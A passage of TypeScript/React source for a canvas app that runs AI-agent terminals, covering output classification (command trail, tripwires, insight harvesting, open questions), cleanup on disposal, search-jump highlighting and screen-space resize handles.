        // status, preview, or the terminal. push() dedups back-to-back redraws.
        if (cmdTrailEnabled()) {
          const trail = useCommandTrail.getState()
          for (const raw of clean.split(/\r\n|\r|\n/)) {
            if (!isMeaningfulLine(raw)) continue
            const squashed = raw.replace(/\s+/g, ' ').trim()
            const det = detectCommand(squashed)
            if (det) trail.push(node.id, det.cmd, det.risk)
          }
        }

        if (line) {
          useLens.getState().set(node.id, line)
          // Echo Index: append the SAME meaningful line into this node's capped
          // searchable ring (zero new parse pass — reuse `line`). Memory-only,
          // fire-and-forget; inside the same guard so it can never affect status.
          useEcho.getState().push(node.id, line)

          // Tripwire: match the SAME meaningful line against every armed
          // user-defined watch pattern (zero new parse pass — reuse `line`).
          // Memory-only, fire-and-forget; a no-op when no wires exist, and inside
          // this same guard so it can never affect status/preview/the terminal.
          useTripwire.getState().scan(node.id, line)

          // Insight Harvester: classify the SAME already-stripped line and, if it
          // is a discovery-grade fact, auto-pin it to the shared Brief Board with
          // full attribution + a `harvested` provenance flag. No new IPC and no
          // second parse pass — reuse `line`. Gated by the settings flag and a
          // per-node throttle so a burst can't spam the board. board.pin() trims/
          // caps/dedups/ring-buffers, so back-to-back dupes are dropped for free.
          // Fire-and-forget inside this same try/catch — can never affect status,
          // preview, or the terminal.
          if (harvestEnabled()) {
            const now = Date.now()
            const last = lastHarvestAt.get(node.id) ?? 0
            if (now - last >= HARVEST_MIN_MS) {
              const fact = harvestFrom(line)
              if (fact) {
                lastHarvestAt.set(node.id, now)
                useBoard.getState().pin({
                  text: fact,
                  sourceNodeId: node.id,
                  sourceTitle: nodeMetaRef.current.title,
                  agent: nodeMetaRef.current.agent,
                  harvested: true
                })
              }
            }
          }

          // Open Questions: the INVERSE of the harvester — classify the SAME
          // already-stripped line and, if it is a genuine agent QUESTION (the
          // lines the harvester rejects), push an Open Question card attributed
          // to this node so the team's accumulated context can answer it. Reuses
          // `line` (no new parse pass), throttled per node like the harvester,
          // memory-only and fire-and-forget inside this same try/catch — it can
          // never affect status, preview, or the terminal. add() dedups + caps.
          {
            const now = Date.now()
            const last = lastQuestionAt.get(node.id) ?? 0
            if (now - last >= QUESTION_MIN_MS) {
              const q = detectQuestion(line)
              if (q) {
                lastQuestionAt.set(node.id, now)
                useQuestions.getState().add({
                  text: q.text,
                  subject: q.subject,
                  askingNodeId: node.id,
                  askingTitle: nodeMetaRef.current.title
                })
              }
            }
          }
        }
      } catch {
        /* never let lens capture affect the terminal */
      }

      // Live preview auto-wiring: detect local dev-server URLs in the same
      // coalesced chunk and open a preview at most once per distinct URL. The
      // throttled flush already debounces, and maybeOpenPreview guards against
      // repeated opens, so a URL printed every reload only ever opens one node.
      if (wantsPreview) {
        for (const url of detectUrls(chunk)) maybeOpenPreview(node.id, url)
      }
    }

    // Holds an incomplete terminal control sequence so OSC 11 background SETs are
    // never split before preserveGlassBackground sees them; prepended to next chunk.
    let bgPending = ''
    const offData = window.canvasio.pty.onData(node.id, (data) => {
      let w = bgPending + data
      bgPending = ''
      // Hold an incomplete trailing CSI (`\x1b[…`) OR OSC (`\x1b]…` with no BEL yet)
      // OR a lone ESC, so a partial terminal control sequence is never written.
      const tail = w.match(/\x1b(\[[0-9;:]*|\][^\x07]*)?$/)
      if (tail) {
        bgPending = tail[0]
        w = w.slice(0, w.length - tail[0].length)
      }
      // Do not rewrite ANSI SGR: each agent keeps its native terminal formatting.
      // Only the global default background is suppressed to preserve Liquid Glass.
      term.write(preserveGlassBackground(w))
      if (exited) return
      pendingChunks += data
      // Cap buffered text so a flood doesn't grow unbounded between flushes.
      if (pendingChunks.length > 16384) pendingChunks = pendingChunks.slice(-16384)
      if (flushTimer == null) flushTimer = window.setTimeout(flushClassify, 200)
    })

    const offExit = window.canvasio.pty.onExit(node.id, (code) => {
      exited = true
      if (flushTimer != null) {
        window.clearTimeout(flushTimer)
        flushTimer = null
      }
      pendingChunks = ''
      term.write('\r\n\x1b[2m[process exited]\x1b[0m\r\n')
      const logical: AgentStatus = code && code !== 0 ? 'error' : 'done'
      applyStatus(logical, mapToVisual(logical))
      // Mission Pulse: record the process exit as a distinct 'close' event (the
      // applyStatus above already logged the done/error transition).
      try {
        useMission.getState().record({
          nodeId: node.id,
          title: nodeMetaRef.current.title,
          agent: nodeMetaRef.current.agent,
          kind: 'close',
          detail: code && code !== 0 ? t('terminalOverlay.exited_with_code', { code }) : undefined
        })
      } catch {
        /* never let mission recording affect exit handling */
      }
    })

    const disp = term.onData((data) => window.canvasio.pty.write(node.id, data))

    // --- Agent Relay: deliver to an ALREADY-idle target ---------------------
    // The readiness gate in applyStatus only fires on a transition. If a handoff
    // is enqueued while this terminal is already sitting idle at its prompt (its
    // own prior work long finished), there is no new edge to ride. Subscribe to
    // the relay queue and, when this node has a pending instruction AND has
    // worked at least once, drain it. deliverRelay is idempotent (relayBusy
    // guard) so this never double-sends with the transition path.
    const offRelay = useRelay.subscribe((s) => {
      if (!relaySawNonIdle) return
      if (!s.queue[node.id]?.length) return
      if (logicalStatus === 'idle' || logicalStatus === 'done') deliverRelay()
    })

    // Real node-size changes: recompute geometry AND resize the PTY. The box's
    // pixel size already follows the drag in LOCKSTEP via applyRect (smooth, no
    // reflow); the EXPENSIVE part — xterm fit + PTY SIGWINCH — is DEBOUNCED so a
    // drag-resize doesn't refit/resize the agent's TUI on every pixel (which made
    // resizing feel terrible and the TUI redraw frantically). While debounced the
    // box grows/shrinks smoothly and its #070c18 background fills the gap; cols/
    // rows snap to the new size shortly after the drag settles.
    let fitTimer: number | null = null
    const scheduleFit = (): void => {
      if (fitTimer != null) window.clearTimeout(fitTimer)
      fitTimer = window.setTimeout(() => {
        fitTimer = null
        recompute(true)
      }, 90)
    }
    const ro = new ResizeObserver(scheduleFit)
    ro.observe(mount)
    const offWin = window.canvasio.onWindowResized(scheduleFit)

    // --- zoom-reactive crisp recompute (debounced) --------------------------
    // On camera.zoom change we re-derive the font, then refit, DEBOUNCED so a
    // pinch/scroll doesn't thrash xterm's reflow + GL atlas re-raster. cols/rows
    // normally stay constant across zoom, so the PTY is not resized (recompute
    // guards on an actual delta). This is now driven by the SINGLE applyRect
    // store subscription above (which already reads s.camera) via recomputeRef,
    // avoiding a second store-wide subscription per box. The box's DOM rect
    // follows immediately in applyRect — only the refit here is debounced.

    return () => {
      disposed = true
      exited = true
      if (flushTimer != null) {
        window.clearTimeout(flushTimer)
        flushTimer = null
      }
      if (deliverTimer != null) {
        window.clearTimeout(deliverTimer)
        deliverTimer = null
      }
      // Stop the claude session-id capture poller so it never touches a disposed
      // terminal (the `disposed` guard inside tick already short-circuits, but we
      // also clear the pending timer to avoid a dangling callback).
      if (claudeCaptureTimer != null) {
        window.clearTimeout(claudeCaptureTimer)
        claudeCaptureTimer = null
      }
      resetNarration(node.id)
      // Mission Pulse: drop this node's events on disposal (memory-only),
      // mirroring resetNarration / relay.clearForNode so a closed terminal
      // leaves no dangling history. clearAll on new_canvas covers the rest.
      try {
        useMission.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Agent Lens: drop this node's live excerpt on disposal (memory-only),
      // mirroring the mission clear above. clearAll on new_canvas covers resets.
      try {
        useLens.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Echo Index: drop this node's searchable ring on disposal (memory-only),
      // mirroring the lens clear above so a closed terminal's lines leave search.
      // clearAll on new_canvas covers resets.
      try {
        useEcho.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Command Trail: drop this node's audit ring on disposal (memory-only),
      // mirroring the echo clear above so a closed terminal's commands leave the
      // timeline. clearAll on new_canvas covers resets.
      try {
        useCommandTrail.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Tripwire: drop hits sourced from this node on disposal (memory-only),
      // mirroring the echo clear above so a closed terminal's hits leave the feed.
      // clearAll on new_canvas covers resets.
      try {
        useTripwire.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Changeset Lens: drop this node's git change summary on disposal
      // (memory-only), mirroring the lens/mission clears above. clearAll on
      // new_canvas covers resets.
      try {
        useChangeset.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Checkpoints: drop this node's in-memory savepoint list on disposal
      // (memory-only); the git refs persist and would be re-listed if the agent
      // returned. clearAll on new_canvas covers resets.
      try {
        useCheckpoints.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Brief Board: drop facts pinned FROM this node on disposal (memory-only),
      // mirroring the lens/changeset/mission clears above so a closed terminal
      // leaves no dangling provenance. clearAll on new_canvas covers resets.
      try {
        useBoard.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Open Questions: drop cards asked by this node on disposal (memory-only),
      // exactly like the board clear right above.
      try {
        useQuestions.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Catch-Up: drop this node's "marked caught-up" watermark on disposal so a
      // reused id can never inherit a stale dismiss (memory-only, mirrors the
      // clears above). The unread itself is derived from the substrates cleared
      // right above, so it goes to zero for free.
      try {
        useCatchup.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      // Insight Harvester: drop this node's throttle entry so the map stays
      // bounded to live nodes (memory-only, mirrors the clears above).
      lastHarvestAt.delete(node.id)
      lastQuestionAt.delete(node.id)
      if (zoomTimerRef.current != null) {
        window.clearTimeout(zoomTimerRef.current)
        zoomTimerRef.current = null
      }
      recomputeRef.current = null
      if (fitTimer != null) {
        window.clearTimeout(fitTimer)
        fitTimer = null
      }
      offRelay()
      // Drop any relay rules referencing this node so a closed terminal can't be
      // a dangling source/target (and free its queued handoffs). Memory-only.
      try {
        useRelay.getState().clearForNode(node.id)
      } catch {
        /* ignore */
      }
      ro.disconnect()
      offWin()
      offData()
      offExit()
      disp.dispose()
      window.canvasio.pty.kill(node.id)
      try {
        webglRef.current?.dispose()
      } catch {
        /* ignore */
      }
      webglRef.current = null
      // Beacon — drop this node's scrollback reader so a closed terminal can never
      // surface in (or be jumped to from) a content search.
      termRegistry.unregister(node.id)
      termRef.current = null
      fitRef.current = null
      term.dispose()
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [node.id])

  // --- Beacon jump: scroll this terminal to a content hit + flash a highlight ---
  // Subscribes to the canvas store's transient beaconTarget signal. When a jump is
  // aimed at THIS node, convert Beacon's relative line index (offset by the window
  // start the reader used) into an absolute buffer line, scroll it into view, and
  // paint a brief decoration over it. Keyed off the monotonic `token` so the same
  // nodeId+line can be re-jumped. Pure renderer-side; no IPC, no geometry.
  useEffect(() => {
    let lastToken = -1
    let clearTimer: number | null = null
    const apply = (
      target: { nodeId: string; line: number; token: number } | null
    ): void => {
      if (!target || target.nodeId !== node.id || target.token === lastToken) return
      lastToken = target.token
      const term = termRef.current
      if (!term) return
      const buf = term.buffer.active
      // Recover the absolute buffer line: Beacon's `line` is relative to the window
      // the reader exposed (which started at beaconReadStartRef). Clamp into range.
      const abs = Math.min(
        Math.max(0, beaconReadStartRef.current + target.line),
        Math.max(0, buf.length - 1)
      )
      try {
        // Scroll so the matched line sits a few rows below the top (context above).
        term.scrollToLine(Math.max(0, abs - 2))
      } catch {
        /* ignore */
      }
      // Transient highlight via a one-line decoration anchored at the matched line.
      try {
        const marker = term.registerMarker(abs - (buf.baseY + buf.cursorY))
        if (marker) {
          const dec = term.registerDecoration({
            marker,
            width: term.cols,
            backgroundColor: '#7aa2ff',
            layer: 'top'
          })
          dec?.onRender((el) => {
            el.style.opacity = '0.32'
            el.style.transition = 'opacity 900ms ease-out'
            // Fade out on the next frame so it reads as a flash, not a static bar.
            requestAnimationFrame(() => {
              el.style.opacity = '0'
            })
          })
          if (clearTimer != null) window.clearTimeout(clearTimer)
          clearTimer = window.setTimeout(() => {
            try {
              dec?.dispose()
              marker.dispose()
            } catch {
              /* ignore */
            }
            clearTimer = null
          }, 1100)
        }
      } catch {
        /* highlight is best-effort; scrolling already happened */
      }
    }
    // Fire for the current value (in case the jump set it just before this mounts),
    // then subscribe for subsequent jumps.
    apply(useCanvas.getState().beaconTarget)
    const unsub = useCanvas.subscribe((s) => apply(s.beaconTarget))
    return () => {
      unsub()
      if (clearTimer != null) window.clearTimeout(clearTimer)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [node.id])

  return (
    <div
      ref={boxRef}
      // Marks this box as a terminal overlay so the canvas wheel handler bails
      // (lets xterm consume the wheel for scrollback instead of panning/zooming).
      data-terminal-overlay
      className={
        'terminal-overlay-box' + (dimmed ? ' dimmed' : '') + (spotlit ? ' spotlit' : '')
      }
      // Stack terminals among themselves exactly like their in-world frames.
      style={{ zIndex: node.z }}
      // Bring this node to front on interaction, mirroring NodeView's behavior,
      // so clicking into a terminal raises it like clicking its frame would.
      onPointerDown={() => {
        const s = useCanvas.getState()
        s.select(node.id)
        if (node.z < s.topZ) s.bringToFront(node.id)
      }}
    >
      <div ref={mountRef} className="terminal-overlay-mount" />
    </div>
  )
})

/**
 * Renders every terminal node's xterm <canvas> in a viewport-fixed, UN-
 * transformed overlay layer that is a SIBLING of .canvas-world (mirroring the
 * existing DrawingOverlays). Each terminal box is projected to the node body's
 * screen rect from the camera at integer device-pixel coordinates with no CSS
 * scale — provably 1:1 with the device pixel grid at any zoom, so the terminal
 * is crisp whether zoomed in or out.
 *
 * The node FRAME (header, border-radius, box-shadow, drag/resize handles) stays
 * in-world via NodeView; only the terminal canvas is portaled out here.
 */
export const TerminalOverlays = memo(function TerminalOverlays(): JSX.Element {
  const nodes = useCanvas((s) => s.nodes)
  const terminals = nodes.filter((n) => n.kind === 'terminal')
  return (
    <div className="terminal-overlays">
      {terminals.map((n) => (
        <TerminalBox key={n.id} node={n} />
      ))}
    </div>
  )
})

// Resize-handle geometry (screen px, constant size at any zoom — matches the
// in-world values NodeView used). OFF is negative so the grab zone straddles the
// frame edge for an easy grab just outside it.
const HANDLE_CORNER = 14
const HANDLE_EDGE = 8
const HANDLE_OFF = -4
const MIN_W = 220
const MIN_H = 140

/**
 * One screen-space resize-handle box per node, positioned at the node's FULL
 * frame rect. The container + box are pointer-events:none; ONLY the 8 grab zones
 * re-enable pointer events, so header drag (in-world) and terminal typing (the
 * z-30 box below) keep receiving events through the transparent center.
 *
 * The box lives at z-31 — above the terminal overlay (z-30) so the previously
 * dead s/e/w/sw/se edges over a terminal body are now grabbable. We replicate
 * TerminalBox's imperative positioning + clip-path occlusion so a back window's
 * handles don't float above a front window that covers it.
 */
const ResizeBox = memo(function ResizeBox({ node }: { node: CanvasNode }): JSX.Element {
  const boxRef = useRef<HTMLDivElement>(null)
  const resize = useRef<{
    px: number
    py: number
    w: number
    h: number
    x: number
    y: number
    dir: string
  } | null>(null)

  useEffect(() => {
    // Same hot-path guard as TerminalBox: the store-wide subscription fires on
    // every change, but only camera/geometry/occlusion affect the handle box. We
    // do an O(1) primitive pre-guard on this node's geometry + camera, then compare
    // higher-z occluder geometry against a numeric snapshot (no string allocation),
    // and bail when nothing relevant moved — so agent-streaming status flips don't
    // trigger O(N) sig-building + clipPathForBox across all resize boxes. The
    // applied rect + clipPath are byte-for-byte identical to before.
    const guard = makeOcclusionGuard()
    const applyRect = (): void => {
      const box = boxRef.current
      if (!box) return
      const s = useCanvas.getState()
      const n = s.nodes.find((x) => x.id === node.id)
      if (!n) return
      // Atlas — at low zoom a terminal's overlay is suspended and shown as an
      // in-world Glance Card; the node is too small to resize meaningfully, so we
      // also hide this terminal's resize-handle box (handles are fixed screen px
      // and would otherwise hover over a few-pixel node). Non-terminal nodes keep
      // their handles. Mirrors the suspended branch in TerminalBox.applyRect.
      if (n.kind === 'terminal' && s.camera.zoom < LOD_ZOOM) {
        box.style.visibility = 'hidden'
        box.style.clipPath = 'none'
        return
      }
      if (guard(n, s.camera, s.nodes)) return
      const r = screenRectForNodeFull(n, s.camera)
      box.style.left = r.left + 'px'
      box.style.top = r.top + 'px'
      box.style.width = r.width + 'px'
      box.style.height = r.height + 'px'
      box.style.visibility = r.visible ? 'visible' : 'hidden'
      box.style.zIndex = String(n.z)
      // Cull handles that fall under a higher-z window so a back window's edges
      // can't be resized through a front one. Reuse the terminal occlusion math.
      box.style.clipPath = r.visible ? clipPathForBox(n, s.nodes, s.camera, r) : 'none'
    }
    applyRect()
    const unsub = useCanvas.subscribe(applyRect)
    return unsub
  }, [node.id])

  const startResize = (dir: string) => (e: React.PointerEvent): void => {
    e.stopPropagation()
    const s = useCanvas.getState()
    const n = s.nodes.find((x) => x.id === node.id)
    if (!n) return
    s.select(n.id)
    if (n.z < s.topZ) s.bringToFront(n.id)
    s.setAutoFit(false)
    // Layout Time Machine — snapshot ONCE at the resize gesture start (never per
    // move) so the whole resize is a single undo step.
    s.snapshotForGesture('resize')
    resize.current = { px: e.clientX, py: e.clientY, w: n.w, h: n.h, x: n.x, y: n.y, dir }
    ;(e.currentTarget as HTMLElement).setPointerCapture(e.pointerId)
  }
  const onResizeMove = (e: React.PointerEvent): void => {
    const r = resize.current
    if (!r) return
    const zoom = useCanvas.getState().camera.zoom
    const dx = (e.clientX - r.px) / zoom
    const dy = (e.clientY - r.py) / zoom
    let { w, h, x, y } = r
    if (r.dir.includes('e')) w = Math.max(MIN_W, r.w + dx)
    if (r.dir.includes('s')) h = Math.max(MIN_H, r.h + dy)
    if (r.dir.includes('w')) {
      w = Math.max(MIN_W, r.w - dx)
      x = r.x + (r.w - w)
    }
    if (r.dir.includes('n')) {
      h = Math.max(MIN_H, r.h - dy)
      y = r.y + (r.h - h)
    }
    useCanvas.getState().updateNode(node.id, { w, h, x, y })
  }
  const onResizeUp = (e: React.PointerEvent): void => {
    resize.current = null
    try {
      ;(e.currentTarget as HTMLElement).releasePointerCapture(e.pointerId)
    } catch {
      /* ignore */
    }
  }

  const handle = (dir: string, cursor: string, style: React.CSSProperties): JSX.Element => (
    <div
      key={dir}
      onPointerDown={startResize(dir)}
      onPointerMove={onResizeMove}
      onPointerUp={onResizeUp}
      style={{
        position: 'absolute',
        background: 'transparent',
        cursor,
        touchAction: 'none',
        pointerEvents: 'auto',
        ...style
      }}
    />
  )

  // A COLLAPSED markdown/folder node is an opaque fixed-size 128x52 icon chip,
  // not a window — it must NOT expose resize handles. Expanded markdown/folder
  // nodes (and every other kind) keep the full 8-handle frame. The resize logic
  // itself is kind-agnostic, so enabling handles here is all that's required.
  const isCollapsedFileNode = (n: CanvasNode): boolean =>
    n.collapsed === true && (n.kind === 'markdown' || n.kind === 'folder')

  return (
    <div ref={boxRef} className="resize-overlay-box">
      {!isCollapsedFileNode(node) && (
        <>
          {handle('n', 'ns-resize', { top: HANDLE_OFF, left: HANDLE_CORNER, right: HANDLE_CORNER, height: HANDLE_EDGE })}
          {handle('s', 'ns-resize', { bottom: HANDLE_OFF, left: HANDLE_CORNER, right: HANDLE_CORNER, height: HANDLE_EDGE })}
          {handle('w', 'ew-resize', { left: HANDLE_OFF, top: HANDLE_CORNER, bottom: HANDLE_CORNER, width: HANDLE_EDGE })}
          {handle('e', 'ew-resize', { right: HANDLE_OFF, top: HANDLE_CORNER, bottom: HANDLE_CORNER, width: HANDLE_EDGE })}
          {handle('nw', 'nwse-resize', { top: HANDLE_OFF, left: HANDLE_OFF, width: HANDLE_CORNER, height: HANDLE_CORNER })}
          {handle('ne', 'nesw-resize', { top: HANDLE_OFF, right: HANDLE_OFF, width: HANDLE_CORNER, height: HANDLE_CORNER })}
          {handle('sw', 'nesw-resize', { bottom: HANDLE_OFF, left: HANDLE_OFF, width: HANDLE_CORNER, height: HANDLE_CORNER })}
          {handle('se', 'nwse-resize', { bottom: HANDLE_OFF, right: HANDLE_OFF, width: HANDLE_CORNER, height: HANDLE_CORNER })}
        </>
      )}
    </div>
  )
})

/**
 * Screen-space resize-handle layer for ALL nodes, a sibling of .canvas-world at
 * z-31 (above the terminal overlay at z-30, below DrawingOverlays at z-45). This
 * replaces NodeView's in-world handles, which a terminal's z-30 overlay box
 * intercepted — the regression where terminals could no longer be resized from
 * the sides/bottom/bottom-corners. The container is pointer-events:none so drag
 * and typing fall through; only the grab zones capture the pointer.
 */
export const ResizeOverlays = memo(function ResizeOverlays(): JSX.Element {
  const nodes = useCanvas((s) => s.nodes)
  return (
    <div className="resize-overlays">
      {nodes.map((n) => (
        <ResizeBox key={n.id} node={n} />
      ))}
    </div>
  )
})
